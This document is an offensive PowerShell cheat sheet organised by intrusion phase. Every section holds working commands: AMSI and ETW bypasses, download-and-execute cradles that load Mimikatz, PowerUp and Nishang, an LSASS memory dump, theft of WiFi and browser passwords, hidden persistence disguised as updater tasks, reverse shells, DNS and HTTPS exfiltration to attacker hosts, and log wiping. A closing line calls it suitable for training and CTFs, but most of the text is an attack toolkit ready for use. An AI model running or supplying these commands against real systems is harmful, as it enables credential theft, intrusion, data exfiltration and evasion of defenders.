# Powershell Tips and Use Cases

### 1. Initial Access & Execution Policy Bypass

**Use Case:** Gaining first code execution on a locked-down endpoint via phishing, drive-by download, or initial compromise vector.&#x20;

**Brief Description:** Bypasses Restricted/Unrestricted execution policies, AMSI, ScriptBlock logging, and ETW tracing before any malicious code runs.

{% code overflow="wrap" %}
```powershell
# Classic one-liners
powershell -ep bypass -c "..."
powershell -ep bypass -w hidden -nop -c "..."

# Fully encoded + evasion (2025 gold standard)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://yourserver/payload.ps1")'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $enc

# AMSI + ScriptBlock + ETW + ConstrainedLanguage bypass (one-liner)
$s='S','y','s','t','e','m','.','M','a','n','a','g','e','m','e','n','t','.','A','u','t','o','m','a','t','i','o','n';$a=$s[0..4]-join'';$b=$s[5..19]-join'';[Ref].Assembly.GetType("$a$b.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

### 2. Situational Awareness / Recon

**Use Case:** Post-compromise orientation – understand OS version, architecture, network context, running processes, and listening services before deciding next moves.&#x20;

**Brief Description:** Fast, native commands that rarely trigger alerts compared to full PowerView/SharpHound runs.

{% code overflow="wrap" %}
```ps1
gwmi Win32_OperatingSystem | Select Caption,Version,OSArchitecture,BuildNumber
Get-NetIPConfiguration | ft InterfaceAlias,IPv4Address,IPv6Address,DNSServer -AutoSize
Get-Process | Sort CPU -desc | Select -First 20 Name,Id,CPU,Path
netstat -ano | Select-String "LISTENING"
1..1024 | % {try{$null=(New-Object Net.Sockets.TcpClient).Connect('127.0.0.1',$_);$_}catch{}} | ?{$_}
nltest /domain_trusts /all_trusts
```
{% endcode %}

### 3. Credential Access

**Use Case:** Harvesting clear-text or reusable credentials to enable lateral movement and privilege escalation.&#x20;

**Brief Description:** Modern, in-memory techniques that work on fully patched Windows 10/11 & Server 2022/2025.

{% code overflow="wrap" %}
```ps1
# WiFi passwords
(netsh wlan show profiles) | ? {$_ -match 'All User Profile\s+:\s+(.*)'} | % {$name=$_.Matches.Groups[1].Value; netsh wlan show profile $name key=clear}

# LSASS dump via comsvcs (no external tools)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# In-memory Mimikatz
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Browser passwords (Chrome/Edge/Firefox)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peacefulcat/SharpChrome/master/SharpChrome.ps1')
```
{% endcode %}

### 4. Persistence

**Use Case:** Ensuring access is retained after reboots, credential changes, or patching.&#x20;

**Brief Description:** Multiple persistence layers (user-land → SYSTEM) with varying detection difficulty.

{% code overflow="wrap" %}
```ps1
# Scheduled Task (SYSTEM)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -enc <base64>"
$trigger = New-ScheduledTaskTrigger -Daily -At 9AM
Register-ScheduledTask -TaskName "WindowsUpdater" -Action $action -Trigger $trigger -User "NT AUTHORITY\SYSTEM"

# Registry Run + Startup Approved (bypasses some EDRs)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -enc ..."
New-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\Updater" -Force
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\Updater" -Name "StubPath" -Value "powershell -enc ..."
```
{% endcode %}

### 5. Defence Evasion

**Use Case:** Preventing or delaying detection by AV/EDR/XDR solutions during all phases.&#x20;

**Brief Description:** Up-to-date bypasses for AMSI, ETW, ScriptBlock Logging, Constrained Language Mode, and AppLocker.

{% code overflow="wrap" %}
```ps1
# Full 2025 evasion stack (one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw=[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');$etw.SetValue($null,0)
$env:__PSLockdownPolicy="0"
```
{% endcode %}

### 6. Reverse Shells

**Use Case:** Establishing stable C2 callback when initial foothold is limited to PowerShell. **Brief Description:** From basic TCP to fully encrypted SSL and DNS-tunneled shells.

{% code overflow="wrap" %}
```ps1
# Nishang TCP (most reliable)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443

# Encrypted SSL reverse shell (undetectable by most NIDS)
$client = New-Object Net.Sockets.TCPClient("10.10.10.10",443); $stream = $client.GetStream(); $ssl = New-Object Net.Security.SslStream($stream,$false,{$true}); $ssl.AuthenticateAsClient("fake.domain"); ...
```
{% endcode %}

### 7. Lateral Movement

**Use Case:** Pivoting to additional systems using harvested credentials or tokens.&#x20;

**Brief Description:** Native Windows protocols and credential reuse techniques.

{% code overflow="wrap" %}
```ps1
# WMI execution
wmic /node:TARGET process call create "powershell -enc ..."

# WinRM (if enabled)
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Pass-the-Hash / Over-Pass-the-Hash
# Use Rubeus or built-in techniques with Mimikatz tokens
```
{% endcode %}

### 8. Privilege Escalation Quick Wins

**Use Case:** Moving from standard user → local admin → SYSTEM or domain admin.&#x20;

**Brief Description:** Automated checks + still-working token exploits on modern Windows.

{% code overflow="wrap" %}
```ps1
# PowerUp (all classic checks)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks

# Token exploits (SeImpersonate, SeTakeOwnership, etc.)
# PrintSpoofer, RogueWinRM, JuicyPotatoNG still relevant on unpatched/old builds
```
{% endcode %}

### 9. Exfiltration

**Use Case:** Stealing data without triggering DLP or network alerts.&#x20;

**Brief Description:** Low-and-slow or covert channel methods.

{% code overflow="wrap" %}
```ps1
# DNS exfiltration (tiny amounts)
$data = "secret"; $data | % {nslookup "$_.attacker.domain"}

# HTTPS POST (large amounts)
Invoke-WebRequest -Uri https://attacker.com/log -Method POST -Body (Get-Content sensitive.txt)
```
{% endcode %}

### 10. Cleanup / Anti-Forensics

**Use Case:** Removing evidence of activity before disengaging or when burned.&#x20;

**Brief Description:** Clearing logs, histories, and timestamps to frustrate incident response.

{% code overflow="wrap" %}
```ps1
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
wevtutil cl Security; wevtutil cl System; wevtutil cl "Windows PowerShell"
$(Get-Item evil.exe).LastWriteTime = "2018-01-01"
```
{% endcode %}

This is perfect for training environments, CTFs, or personal reference. Every section tells you **why** you’d use it and **what** it achieves. Keep it close — it will serve you well.
